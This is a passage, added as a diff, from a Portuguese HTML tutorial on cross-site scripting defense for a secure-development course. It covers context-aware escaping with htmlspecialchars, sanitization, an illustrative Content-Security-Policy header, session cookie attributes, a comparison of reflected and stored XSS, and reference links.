+<h3>7.3 Aplicação da correção aos contextos observados</h3>
+<div class="xss-tutorial-code-label">PHP/HTML · proposta didática, não alteração aplicada à FatecCorp · somente leitura</div><pre><code>&lt;?php
+$busca = $_GET['busca'] ?? '';
+if (!is_string($busca)) {
+    $busca = ''; // Política ilustrativa para formato inesperado.
+}
+$buscaHtml = htmlspecialchars(
+    $busca, ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8'
+);
+?&gt;
+&lt;input type="text" name="busca" value="&lt;?= $buscaHtml ?&gt;"&gt;
+&lt;strong&gt;&lt;?= $buscaHtml ?&gt;&lt;/strong&gt;</code></pre>
+<p>A mesma entrada da News é exibida em texto HTML e em um atributo comum com aspas. Nesses dois pontos, essa codificação é adequada. É necessário aplicá-la a <strong>todas</strong> as ocorrências, inclusive ao segundo strong identificado. O template mantém fixos o nome do elemento e o nome do atributo; não permite que o usuário escolha um handler.</p>
+<p>Para Contact, o conteúdo recuperado de message deve receber proteção equivalente antes de aparecer no div se o produto pretende aceitar apenas texto. A regra também vale para nomes e empresas exibidos, mesmo que esses campos não tenham sido testados com payload. O formato de armazenamento e os nomes internos de variáveis PHP não foram inspecionados, portanto não se apresenta um patch fictício do servidor.</p>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Contexto de saída</th><th scope="col">Tratamento adequado</th><th scope="col">Armadilha comum</th></tr></thead><tbody><tr><td>Texto HTML</td><td>Escape HTML, como htmlspecialchars, ou API textContent quando houver manipulação legítima de texto no cliente.</td><td>Concatenar a entrada como HTML.</td></tr><tr><td>Atributo HTML comum</td><td>Nome fixo e seguro, valor entre aspas e escape de aspas e caracteres HTML.</td><td>Presumir que o escape torna seguro um atributo onfocus: ele contém código.</td></tr><tr><td>URL em href ou src</td><td>Validar esquema e destino permitidos, codificar componentes da URL e aplicar escape HTML ao inserir em atributo.</td><td>Confundir encodeURIComponent com validação; uma URL javascript: exige rejeição, não só escape.</td></tr><tr><td>Strings JavaScript</td><td>Preferir separar dados do código e usar serialização JSON apropriada ao canal de entrega.</td><td>Usar htmlspecialchars como escape JavaScript ou concatenar dados em script inline. Até dados serializados exigem cuidado com o fechamento do elemento script.</td></tr><tr><td>HTML formatado</td><td>Sanitizador mantido, com lista de elementos, atributos e protocolos permitidos.</td><td>Usar regex, remover apenas script ou confiar em conteúdo já salvo.</td></tr></tbody></table></div>
+<p>Comentários HTML, nomes de tags, nomes de atributos e atributos de evento são destinos especialmente inadequados para dados arbitrários. A opção mais segura é reorganizar a construção da interface para manter dados em posições de texto. Escape automático de templates ajuda, mas precisa corresponder ao contexto real; marcações “safe” ou equivalentes podem desativá-lo.</p>
+<h3>7.4 Sanitização quando o produto aceita formatação</h3>
+<p>Codificação de saída faz a marcação aparecer como texto. <strong>Sanitização</strong> analisa HTML e conserva somente a estrutura autorizada — por exemplo, parágrafos e negrito — retirando elementos, atributos e protocolos perigosos. A escolha depende do requisito: uma mensagem simples não precisa aceitar HTML; um editor rico pode precisar de um subconjunto seguro.</p>
+<p>Um sanitizador confiável deve compreender o parser e as regras das URLs, acompanhar atualizações de segurança e ser configurado para o caso de uso. Uma biblioteca mantida, como DOMPurify no ambiente apropriado, é uma referência possível, não uma dependência deste tutorial. Alterar o HTML depois da sanitização pode reintroduzir risco. A aplicação também precisa considerar o conteúdo antigo quando modifica a política.</p>
+<h3>7.5 Content Security Policy como defesa adicional</h3>
+<div class="xss-tutorial-code-label">HTTP · política ilustrativa, exige adaptação à aplicação · somente leitura</div><pre><code>Content-Security-Policy: default-src 'self'; script-src 'self'; img-src 'self'; object-src 'none'; base-uri 'self'</code></pre>
+<p>A política exemplifica scripts e imagens limitados à mesma origem, bloqueio de objetos e restrição de base URI. Sem permissões adicionais, scripts inline e handlers dos exemplos tendem a ser bloqueados. Para scripts inline legítimos, nonces imprevisíveis por resposta ou hashes podem autorizar trechos específicos; adicionar indiscriminadamente <code>unsafe-inline</code> enfraquece essa proteção.</p>
+<p>Não basta permitir “qualquer arquivo do próprio site” se o site também hospeda conteúdo não confiável executável. CSP deve ser planejada, observada e implantada considerando os recursos necessários. <code>Content-Security-Policy-Report-Only</code> permite avaliar violações sem bloquear, mas não equivale à política aplicada. A configuração de cabeçalho pertence à aplicação ou ao servidor, não ao texto de uma página Moodle.</p>
+<p>Uma CSP que restrinja img-src pode bloquear o receptor do exemplo mesmo se houver execução por outra via. Isso é contenção de um caminho de saída, não correção da concatenação insegura. Consulte a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP">documentação de CSP da MDN</a>.</p>
+<h3>7.6 Sessões e desenvolvimento seguro</h3>
+<p>Cookies de sessão devem combinar atributos apropriados, transporte HTTPS e gerenciamento de sessão: expiração, renovação quando necessário e invalidação no servidor. HttpOnly reduz leitura de identificadores; Secure protege seu envio no transporte; SameSite limita certos contextos entre sites. Nenhum desses atributos substitui a proteção dos pontos de saída.</p>
+<ul><li><strong>Separar dados de código:</strong> usar templates com escape adequado e APIs de texto; evitar montagem de HTML por concatenação.</li><li><strong>Manter contextos previsíveis:</strong> fixar nomes de elementos e atributos, usar aspas e reduzir handlers inline.</li><li><strong>Validar contratos:</strong> tipo, comprimento e formato devem refletir as regras do produto, sem serem tratados como defesa única contra injeção.</li><li><strong>Tratar cada visualização:</strong> páginas públicas, relatórios e telas administrativas precisam preservar a mesma fronteira de confiança.</li><li><strong>Combinar defesas:</strong> escape contextual, sanitização quando necessária, CSP, sessões protegidas e bibliotecas atualizadas.</li><li><strong>Verificar a correção:</strong> o mesmo marcador deve aparecer como dado; os efeitos de execução anteriores devem desaparecer sem destruir o conteúdo legítimo.</li></ul>
+<p>A <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP XSS Prevention Cheat Sheet</a> organiza as recomendações por contexto. Bloquear uma lista de palavras ou confiar que um campo “não deveria receber HTML” deixa a decisão de interpretação nas mãos do navegador.</p>
+</section>
+<section class="xss-tutorial-module" id="xss-tutorial-m8"><div class="xss-tutorial-kicker">Módulo 08</div><h2>Comparação geral</h2>
+<div aria-label="Tabela com rolagem horizontal" class="xss-tutorial-table-wrap" role="region" tabindex="0"><table><thead><tr><th scope="col">Característica</th><th scope="col">Reflected XSS</th><th scope="col">Stored XSS</th></tr></thead><tbody><tr><td>Origem</td><td>Entrada refletida da requisição atual.</td><td>Conteúdo persistido e recuperado.</td></tr><tr><td>Armazenamento</td><td>Não é necessário para a execução.</td><td>Existe persistência entre envio e recuperação.</td></tr><tr><td>Execução</td><td>Navegador que interpreta a resposta vulnerável.</td><td>Navegador que visualiza o conteúdo recuperado.</td></tr><tr><td>Exemplo no laboratório</td><td>News: parâmetro busca.</td><td>Contact: message no mural público.</td></tr><tr><td>Momento</td><td>Ao receber a resposta que reflete a entrada.</td><td>Ao exibir o conteúdo armazenado; pode incluir a resposta ao envio.</td></tr><tr><td>Alcance</td><td>Depende da exposição à entrada e à resposta.</td><td>Pode atingir quem visualizar o conteúdo vulnerável.</td></tr><tr><td>Contextos vulneráveis</td><td>Texto HTML e atributo value confirmados na News.</td><td>Conteúdo de div confirmado no mural.</td></tr><tr><td>Impactos</td><td>Dependem de contexto, dados, privilégios e defesas.</td><td>Dependem dos mesmos fatores, além da exposição das visualizações.</td></tr><tr><td>Proteção</td><td>Tratamento contextual em cada ponto de saída.</td><td>Tratamento contextual em cada recuperação e sanitização se HTML for permitido.</td></tr></tbody></table></div>
+<p>Nenhuma categoria é sempre mais perigosa que a outra. Uma reflexão em uma área sensível pode causar mais impacto que uma mensagem persistente pouco acessada; o inverso também é possível. O que muda é o caminho pelo qual a entrada chega à visualização. O problema técnico comum é atribuir significado de código a dados não confiáveis.</p>
+<aside class="xss-tutorial-note"><strong>Síntese técnica</strong><p>Receber uma entrada não exige executá-la. Armazenar uma entrada não a torna confiável. Exibir uma entrada exige conhecer o contexto de interpretação. Na FatecCorp, a busca e o mural mostraram duas formas de alcançar a mesma fronteira: o navegador passou a interpretar dados como instruções. A correção preserva esses dados como dados e combina proteção contextual com controles de sessão e execução.</p></aside>
+</section>
+<section class="xss-tutorial-module" id="xss-tutorial-m9"><div class="xss-tutorial-kicker">Módulo 09</div><h2>Referências técnicas</h2>
+<p>Links oficiais consultados em 27/10/2026. As referências aprofundam os conceitos; as confirmações específicas da FatecCorp vêm da inspeção local descrita nos módulos 3, 4 e 6.</p>
+<ol>
+<li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP — Cross Site Scripting Prevention Cheat Sheet</a> — Codificação contextual, sanitização e defesa em profundidade.</li>
+<li><a href="https://owasp.org/www-project-web-security-testing-guide/">OWASP — Web Security Testing Guide</a> — Metodologia de identificação e registro de evidências em testes autorizados.</li>
+<li><a href="https://portswigger.net/web-security/cross-site-scripting">PortSwigger Web Security Academy — Cross-site scripting</a> — Conceitos e distinção entre formas de entrega de payloads.</li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript">MDN Web Docs — JavaScript</a> — Referência de linguagem para compreender chamadas, valores e expressões.</li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/Cookies">MDN Web Docs — Using HTTP cookies</a> — Funcionamento de cookies e atributos de segurança.</li>
+<li><a href="https://cwe.mitre.org/data/definitions/79.html">MITRE — CWE-79</a> — Classificação da neutralização inadequada de dados na geração de páginas.</li>
+<li><a href="https://www.php.net/manual/en/function.htmlspecialchars.php">PHP — htmlspecialchars</a> — Semântica da função, parâmetros e opções de codificação.</li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP">MDN — Content Security Policy</a> — Diretivas e limites de execução e carregamento de recursos.</li>
+<li><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content">MDN — Mixed content</a> — Restrições a recursos HTTP em páginas HTTPS.</li>
+</ol>
+</section>
+<footer class="xss-tutorial-footer">Material de consulta para Desenvolvimento Seguro. Demonstrações restritas ao laboratório autorizado; exemplos de sessão e transferência usam valores fictícios. Nenhum código de demonstração é executado por esta apostila.</footer></article>
+<!-- FIM DO CONTEÚDO PARA MOODLE -->
+</body></html>
